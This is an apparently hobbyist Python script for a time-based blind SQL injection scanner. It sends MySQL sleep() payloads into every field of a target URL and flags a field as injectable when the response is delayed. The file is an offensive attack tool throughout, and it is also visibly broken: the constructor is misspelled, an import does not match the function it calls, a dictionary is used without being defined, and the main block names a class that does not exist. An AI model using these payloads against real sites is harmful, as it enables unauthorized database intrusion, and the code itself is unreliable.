import requests
import time
from termcolor import color

class SavageSQLInjection(object):
    def __innit__(self, target=None, fields=None, method=None):
        self.payload = [
            {
                'description' : 'MySQL SELECT time based attack',
                'payload' : "1' OR 0=sleep(11) LIMIT 1 #",
                'dbms' : 'mysql',
                'type' : 'SELECT'
            },
            {
                'description' : 'MySQL UPDATE time based attack',
                'payload' : "1' * sleep(11) * '1",
                'dbms' : 'mysql',
                'type' : 'UPDATE'
            }
        ]
        if target:
            self.target = target
        else:
            self.target = input("Enter target: ")
        if fields:
            self.fields = fields
        else:
            self.fields = input("Enter comma seperated fields:  ")
            self.fields = self.fields.split(',')
        if method:
            self.method = method
        else:
            self.method = input("Enter method (get/post): ")
    
    def inject(self):
        print(colored("[i] ", "blue") + "Getting Baseline")
        start = time.time()
        if self.method == "post":
            r = requests.post(url=self.target)
        else:
            r = requests.get(url=self.target)
        end = time.time()
        baseline = end - start

        if r.status_code >= 500:
            #later
            None
        if r.status_code >=200 and r.status_code < 300:
            for payload in self.payload:
                for field in self.fields:
                    print(colored("[i] ", "blue") + "Attacking " + field + " with " + payload['description'])
                    for secondfield in self.fields:
                        if secondfield == field:
                            data[secondfield] = payload['payload']
                        else:
                            data[secondfield] = "asd"
                    start = time.time()
                    if self.method == "post":
                        try:
                            r = requests.post(url=self.target, data=data, timeout =12)
                        except:
                            None
                    else:
                        try:
                            r = requests.get(url=self.target, params=data, timeout = 12)
                        except:
                            None
                    end = time.time()
                    elapsed = end - start
                    if elapsed - baseline >= 10:
                        print(colored("[$] ", "green") + field + " Likely injectable!")
if __name__ == "__main__":
    sqlinject = SavageSQLInject()
    sqlinject.inject()
        

